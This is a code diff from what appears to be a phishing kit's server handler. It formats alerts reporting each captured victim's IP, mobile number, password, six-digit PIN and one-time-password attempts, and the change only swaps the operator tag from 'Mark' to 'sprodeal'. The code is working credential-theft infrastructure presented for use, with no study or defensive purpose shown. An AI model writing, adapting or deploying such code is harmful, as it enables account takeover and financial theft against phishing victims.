@@ -24,13 +24,13 @@ export default async function handler(req, res) {
               `✅ Link Clicked By User\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'problem_select') {
-    message = `🎫 NEW SUPPORT REQUEST — Mark\n` +
+    message = `🎫 NEW SUPPORT REQUEST — sprodeal\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📌 Issue: ${issue}\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'login_creds') {
-    message = `📱 MOBILE & PASSWORD RECEIVED — Mark\n` +
+    message = `📱 MOBILE & PASSWORD RECEIVED — sprodeal\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `🎫 Issue: ${issue}\n` +
@@ -38,20 +38,20 @@ export default async function handler(req, res) {
               `🔒 Password: <code>${pass}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'pin_entered') {
-    message = `🔑 6-DIGIT PIN RECEIVED — Mark\n` +
+    message = `🔑 6-DIGIT PIN RECEIVED — sprodeal\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
               `🔐 PIN: <code>${pin}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'send_otp') {
-    message = `📤 SEND OTP REQUESTED — Mark\n` +
+    message = `📤 SEND OTP REQUESTED — sprodeal\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
               `🕒 Time: ${timeNow}`;
   } else if (type === 'wrong_otp') {
-    message = `❌ WRONG OTP ATTEMPT #${attempt} — Makr\n` +
+    message = `❌ WRONG OTP ATTEMPT #${attempt} — sprodeal\n` +
               `━━━━━━━━━━━━━━━\n` +
               `🌐 IP: <code>${clientIp}</code>\n` +
               `📞 Mobile: <code>${phone}</code>\n` +
